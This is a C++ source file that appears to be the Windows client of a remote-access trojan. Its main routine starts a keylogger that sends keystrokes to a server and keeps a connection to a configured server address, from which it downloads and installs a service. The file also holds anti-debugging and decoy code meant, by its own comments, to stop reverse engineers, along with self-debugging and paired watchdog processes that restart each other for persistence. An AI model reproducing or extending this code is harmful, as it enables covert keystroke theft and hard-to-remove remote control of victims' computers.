#include "general.h"
#include "serviceutils.h"
#include "utils.h"

#include <windows.h>
#include <psapi.h>
#include <shellapi.h>

typedef __success(return >= 0) LONG NTSTATUS;

//Thread used to check if main shell is running, and if it not start it
void BackupThread();
//Thread used to check if backup shell is still running, and if not start it and close itself
void CheckBackupRunningThread();
//Straightforward ig
void CreateAndStartBackupOnDisk();
//Also name self explanatory
void RestartBackupShellAndExit();
//Used to set privileges on the current process, in particular to terminate a system process
NTSTATUS EnablePrivilege(wchar_t* privilege);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//Alloc console for debug purposes
	CreateDebugConsole();

	//Process to terminate at start
	std::string args(lpCmdLine);
	if (args.length()) {
		Log("Given process to close in argument\n");
		//NTSTATUS result = EnablePrivilege(L"SeDebugPrivilege");
		//if (result != 0)
		//{
		//	Log("could not set SE_DEBUG_NAME Privilege\n");
		//}
		int split_index = args.find(',');
		std::string to_del = args.substr(0, split_index);
		std::string to_close = args.substr(split_index + 1, args.length() + 1);

		HANDLE hProc = 0;
		auto procID = Utils::getProcess(to_close.c_str(), false);
		if (procID) {
			Log("Found proc ID\n");
			const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
			TerminateProcess(hBackupShell, 1);
			CloseHandle(hBackupShell);
		}
		else {
			Log("Proc ID not found\n");
		}

		remove(to_del.c_str());
	}
	else {
		Log("No args given\n");
	}

	Utils::CheckFullPath();

	//Main logic of backup shell will be executed in an external thread
	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)BackupThread, NULL, NULL, NULL);

	//BEGINNING OF USELESS CODE
	// This routine is pretty small, could be expanded upon, but might as well make a packer/obfuscator at that point. This should be enough
	// to keep any unexperienced cracker the fuck out of the way
	// 
	//If full module path == backup module path, do useless shit in main thread
	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { 
		while (true) {
			//Just to fuck with reverse engineers allocate some apparently useful string
			char* uselessString = "GetNativeSystemInfo"; 
useless_backup_shell_code:
			//I mean, why not
			if (!IsDebuggerPresent()) { 
				//Get random ass handle cuz people put hooks on this shit when debugging
				HMODULE hUseless = GetModuleHandle(TEXT("kernel32.dll")); 
				//This always returns 0 if second parameter is 0 so it will never jump (dont write if(false) since compiler will optimize and delete the branch
				if (IsBadReadPtr(uselessString, 0)) { 
					goto non_backup_shell_code;
				}
			}
			//Some reverse engineers assume you will do process hijacking to svchost (it's common practice since svchost always exists and it's a common process so easy to "hide")
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess("svchost.exe"));
			//Now do some useless operation with this handle
			MEMORY_BASIC_INFORMATION mbi;
			if (VirtualQueryEx(hProc, (LPCVOID)uselessString, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) { //Do useless stuff on this data
				if (mbi.Protect)
					goto useless_backup_shell_code;
			}
			Sleep(1000);
		}
	}

	//END OF USELESS CODE
	//BEGINNING OF MAIN SHELL CODE (VARIOUS CHECKS)
non_backup_shell_code:
	Log("Got to main shell code\n");
	Utils::CheckFullPath();
	//Check that parent process name == SHELL_BACKUP_NAME
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(GetCurrentProcessId()));
	if (!hProcess) {
		CreateAndStartBackupOnDisk();
		PauseAndExit(1);
	}
	//Check parent process full path to make sure that it's the backup shell and that it was started from the right folder
	CHAR Buffer[MAX_PATH];
	if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
	{
		// At this point, buffer contains the full path to the executable
		if (strcmp(Buffer, SHELL_BACKUP_EXE)) {
			//They don't match
			Log("Parent process full path doesn't match SHELL_BACKUP_EXE\n");
			CreateAndStartBackupOnDisk();
			PauseAndExit(1);
		}
		//They match so go on and do shit
	}
	else
	{
		//Couldn't get full path for some reason, so give it 0 chances and just quit instead of looping
		PauseAndExit(1);
	}
	CloseHandle(hProcess);
	//END OF CHECKS

	//This thread is used to make sure the backup thread is always active, for more info go check out the method
	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CheckBackupRunningThread, NULL, NULL, NULL);

	//Delete update file
	remove(SHELL_PATH(SHELL_UPDATE_NAME));

	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::KeyloggerThread, NULL, NULL, NULL); //Thread to send keylogs to server
	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::HearthBeatThread, NULL, NULL, NULL); //Thread to send keylogs to server

	//Main loop
	while (true)
	{
		if (!Client::main_client.connected)
		{
			Log("Client not connected, attempting to connect...\n");
			while (!Client::main_client.Connect())
			{
				Log((("Failed to connect...\n" + std::string(Settings::serverIP) + ":" + std::to_string(Settings::serverPort) + '\n').c_str()));
				Sleep(1000);
			}
		}
		else {
			//Log("Client connected!\n");
			//If service doesn't exist download the archive from server (will need to have external.zip inside Server.exe folder), create and start the service.
			//Keep on looping just in case they close the service, but keep high delay since the function is decently heavy and we don't want anything weird happening.
			Service::CheckAndRepairService();
		}

		Sleep(1000);
	}

	return 0;
}

void DebuggerThread() {
	Log("Started debugger thread\n");
	//Just ignore any debug events and continue execution
	DEBUG_EVENT debug_event = { 0 };
	for (;;)
	{
		if (!WaitForDebugEvent(&debug_event, INFINITE)) {
			Sleep(100);
			continue;
		}
		//Place your code to handle the event here:
		//Fucking nothing, literally skip through everything
		//End
		ContinueDebugEvent(debug_event.dwProcessId,
			debug_event.dwThreadId,
			DBG_CONTINUE);
	}
}

NTSTATUS EnablePrivilege(wchar_t* privilege)
{
	HANDLE token;
	TOKEN_PRIVILEGES* tp = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
		goto error;

	tp = (TOKEN_PRIVILEGES*)new char[offsetof(TOKEN_PRIVILEGES, Privileges[1])];
	if (!tp)
		goto error;
	tp->PrivilegeCount = 1;
	tp->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValueW(0, privilege, &tp->Privileges[0].Luid))
		goto error;

	if (!AdjustTokenPrivileges(token, 0, tp, 0, 0, 0) || GetLastError() != ERROR_SUCCESS)
		goto error;

	CloseHandle(token);

	return 0x0;
error:
	if (tp)
		delete[] tp;

	return 0xC0000001;
}

void BackupThread() {
	//Check if this executable is the backup executable
	if (strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path != backup module path, do nothing
		return;
	}
	//Check if another backup shell is running
	else { 
		//If more than 1 backup shell is running exit process
		if (Utils::getProcessCount(SHELL_BACKUP_NAME) > 1) { 
			Log("Another backup shell found, closing it\n");
			NTSTATUS result = EnablePrivilege(L"SeDebugPrivilege");
			if (result != 0)
			{
				Log("could not set SE_DEBUG_NAME Privilege\n");
			}
			HANDLE hProc = 0;
			auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
			if (procID) {
				Log("Found backup shell process ID\n");
				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
				TerminateProcess(hBackupShell, 1);
				CloseHandle(hBackupShell);
			}
		}
	}
	//Wait for main shell to exist on disk in case this routine was called after an update
	while (GetFileAttributesA(SHELL_EXE) == INVALID_FILE_ATTRIBUTES) {
		Sleep(100);
	}

	Log("Got into backup shell main thread\n");
	//Get an handle to the main shell
	HANDLE hProc = 0;
	auto procID = Utils::getProcess(SHELL_NAME);
	//Attempt to start the shell if not already started
	if (!procID) {
		Log("Elevated shell process not found\n");
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		ZeroMemory(&info, sizeof(info));
		ZeroMemory(&processInfo, sizeof(processInfo));
		//Create process with debugging flag, since only one debugger can be attached to a process at a time, the shell will "debug itself"
		while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &info, &processInfo))
		{
			Sleep(100);
		}
		CloseHandle(processInfo.hThread);
		hProc = processInfo.hProcess;
		//Start debugger thread to handle debug events (just skip through them)
		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)DebuggerThread, NULL, NULL, NULL);
	}
	else {
		Log("Got process ID successfully\n");
		//If main shell is already started check that the parent process path == SHELL_BACKUP_PATH
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(procID));
		if (!hProcess) {
			Log("Could not open an handle to the process");
			//When in doubt close the main shell
			const auto hMainShell = OpenProcess(PROCESS_TERMINATE, false, procID);
			TerminateProcess(hMainShell, 1);
			CloseHandle(hMainShell);
		}
		else {
			CHAR Buffer[MAX_PATH];
			if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
			{
				// At this point, buffer contains the full path to the executable
				if (strcmp(Buffer, SHELL_BACKUP_EXE)) {
					//They don't match so kill main shell
					Log("Parent process of main shell process doesn't match SHELL_BACKUP_EXE, closing main shell");
					const auto hMainShell = OpenProcess(PROCESS_TERMINATE, false, procID);
					TerminateProcess(hMainShell, 1);
					CloseHandle(hMainShell);
				}
				//They match so go on and do shit
			}
			else
			{
				PauseAndExit(1);
			}
			CloseHandle(hProcess);
		}
	}
	if(!hProc)
		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

	//Main check loop to make sure main shell is still running and being debugged
	while (true) {
		//Get exit code
		DWORD exitCode;
		while (!GetExitCodeProcess(hProc, &exitCode)) {
			Sleep(100);
		}

		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
		if (exitCode != STILL_ACTIVE) { //If process has stopped attempt to restart it
			CloseHandle(hProc);
			STARTUPINFO info = { sizeof(info) };
			PROCESS_INFORMATION processInfo;
			ZeroMemory(&info, sizeof(info));
			ZeroMemory(&processInfo, sizeof(processInfo));
			while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
			{
				Sleep(100);
			}
			CloseHandle(processInfo.hThread);
			hProc = processInfo.hProcess;
		}
		Sleep(100);
	}
}

void RestartBackupShellAndExit() {
	//If not running first attempt to copy the image to disk, then run it
	CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
	Log("Created backup shell on disk\n");

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&info, sizeof(info));
	ZeroMemory(&processInfo, sizeof(processInfo));
	while (!CreateProcessA(SHELL_BACKUP_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
	{
		Sleep(100);
	}
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
	Log("Started backup shell\n");

	//After backup shell is started make sure to quit this executable
	PauseAndExit(1);
}

//This is the secondary routine for the main shell
void CheckBackupRunningThread() {
	Log("Started backup shell check thread\n");
	HANDLE hProc = 0;
	auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
	if (!procID) {
		RestartBackupShellAndExit();
	}

	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

	//Main loop of the routine
	while (true) {
		//Get exit code
		DWORD exitCode;
		while (!GetExitCodeProcess(hProc, &exitCode)) {
			Sleep(100);
		}
		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
		if (exitCode != STILL_ACTIVE) { 
			Log("Backup shell has been closed\n");
			RestartBackupShellAndExit();
		}
		if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME))) {
			auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
			if (procID) {
				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
				TerminateProcess(hBackupShell, 1);
				CloseHandle(hBackupShell);
			}
			while (1) Sleep(1000); //Wait for updating thread to close process once the update has finished downloading
		}
		Sleep(100);
	}
}

void CreateAndStartBackupOnDisk() {
	//Copy file on disk
	CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);

	//Execute SHELL_BACKUP
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&info, sizeof(info));
	ZeroMemory(&processInfo, sizeof(processInfo));
	while (!CreateProcessA(SHELL_BACKUP_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
	{
		Sleep(100);
	}
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);

	Log("Created backup shell process\n");
}